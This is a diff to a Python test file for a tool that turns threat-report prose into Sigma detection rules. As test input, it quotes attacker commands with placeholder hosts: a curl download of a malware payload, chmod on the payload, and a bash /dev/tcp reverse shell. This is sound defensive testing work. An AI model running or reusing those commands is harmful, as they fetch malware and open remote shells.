@@ -55,6 +55,18 @@ def test_builtins_placeholders_and_prose_are_not_commands() -> None:
     assert "[payload URL]" not in str(selections)
 
 
+def test_markdown_command_lists_do_not_leak_markup_or_placeholder_filenames() -> None:
+    text = """The loader executed these commands on the Mac:
+- `system_profiler SPHardwareDataType`: collected hardware information.
+- `chmod +x com.apple.verified`: made the payload executable.
+- `curl -kFsSL [payload URL] -o [random filename]`: downloaded the malware.
+"""
+    selections = _selections(text, ["macOS"])
+    assert selections == {"/system_profiler": "SPHardwareDataType", "/chmod": "+x com.apple.verified"}
+    assert "`" not in str(selections)
+    assert "filename" not in str(selections)
+
+
 def test_elided_and_placeholder_arguments_are_excluded() -> None:
     text = "The adversary executed curl http(s)://... to stage payloads and bash /dev/tcp/<ip>/<port> for reverse shells."
     candidates = command_candidates(text, ["Linux"])
@@ -210,11 +222,20 @@ def test_unittest_and_benchmarks_are_filtered() -> None:
 def test_documented_reference_candidates_keep_exact_request_and_reference_wording() -> None:
     import yaml
 
-    candidate = {"category": "webserver", "title": "Nuclei reference request: PATCH /api/probe", "command": "PATCH /api/probe",
-                 "detection": {"selection": {"cs-method": "PATCH", "cs-uri-stem": "/api/probe"}, "condition": "selection"},
-                 "behaviour": "PATCH /api/probe", "passage": "Documented probe request: PATCH /api/probe"}
+    candidate = {
+        "category": "webserver",
+        "title": "Nuclei reference request: PATCH /api/probe",
+        "command": "PATCH /api/probe",
+        "detection": {"selection": {"cs-method": "PATCH", "cs-uri-stem": "/api/probe"}, "condition": "selection"},
+        "behaviour": "PATCH /api/probe",
+        "passage": "Documented probe request: PATCH /api/probe",
+    }
     agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
-    data = SigmaGenerationInput(hypothesis="Look for documented exploit probes", reference_candidates=[candidate], references=["https://example.com/pinned-template"])
+    data = SigmaGenerationInput(
+        hypothesis="Look for documented exploit probes",
+        reference_candidates=[candidate],
+        references=["https://example.com/pinned-template"],
+    )
     [(rule, problem)] = agent._command_rules(data)
     assert problem is None and rule is not None
     document = yaml.safe_load(rule.rule_yaml)
@@ -228,12 +249,18 @@ def test_documented_reference_candidates_keep_exact_request_and_reference_wordin
 def test_a_reference_candidate_keeps_its_own_falsepositives_and_level() -> None:
     import yaml
 
-    candidate = {"category": "webserver", "title": "Hunting lead: POST /flows as the PoC README documents",
-                 "command": "POST /flows", "level": "low",
-                 "falsepositives": "Legitimate clients of the product send POST /flows too",
-                 "detection": {"selection": {"cs-method": "POST", "cs-uri-stem": "/flows"}, "condition": "selection"}}
+    candidate = {
+        "category": "webserver",
+        "title": "Hunting lead: POST /flows as the PoC README documents",
+        "command": "POST /flows",
+        "level": "low",
+        "falsepositives": "Legitimate clients of the product send POST /flows too",
+        "detection": {"selection": {"cs-method": "POST", "cs-uri-stem": "/flows"}, "condition": "selection"},
+    }
     agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
-    [(rule, problem)] = agent._command_rules(SigmaGenerationInput(hypothesis="Reference probe", reference_candidates=[candidate]))
+    [(rule, problem)] = agent._command_rules(
+        SigmaGenerationInput(hypothesis="Reference probe", reference_candidates=[candidate])
+    )
     assert rule and not problem
     document = yaml.safe_load(rule.rule_yaml)
     assert document["level"] == "low"
@@ -243,17 +270,26 @@ def test_a_reference_candidate_keeps_its_own_falsepositives_and_level() -> None:
 def test_reference_web_rule_transpiles_to_real_ecs_fields_and_fails_closed_without_http_tables() -> None:
     from hecate_agent.core.sigma_transpiler import SigmaTranspiler
 
-    candidate = {"category": "webserver", "title": "Documented Nuclei request", "command": "PATCH /api/probe?x=1",
-                 "detection": {"selection": {"cs-method": "PATCH", "cs-uri-stem": "/api/probe", "cs-uri-query": "x=1"}, "condition": "selection"}}
+    candidate = {
+        "category": "webserver",
+        "title": "Documented Nuclei request",
+        "command": "PATCH /api/probe?x=1",
+        "detection": {
+            "selection": {"cs-method": "PATCH", "cs-uri-stem": "/api/probe", "cs-uri-query": "x=1"},
+            "condition": "selection",
+        },
+    }
     agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
-    [(rule, problem)] = agent._command_rules(SigmaGenerationInput(hypothesis="Reference probe", reference_candidates=[candidate]))
+    [(rule, problem)] = agent._command_rules(
+        SigmaGenerationInput(hypothesis="Reference probe", reference_candidates=[candidate])
+    )
     assert rule and not problem
     results = SigmaTranspiler().transpile(rule.rule_yaml)
     assert results[SigmaTranspiler.TARGET_SPLUNK].success
     elastic = results[SigmaTranspiler.TARGET_ELASTIC]
     assert elastic.success
-    assert 'http.request.method' in elastic.query and 'url.path' in elastic.query and 'url.query' in elastic.query
-    assert 'cs-method' not in elastic.query
+    assert "http.request.method" in elastic.query and "url.path" in elastic.query and "url.query" in elastic.query
+    assert "cs-method" not in elastic.query
     mde = results[SigmaTranspiler.TARGET_MDE]
     assert not mde.success and "explicit deployed table and field mapping" in mde.error_message
 
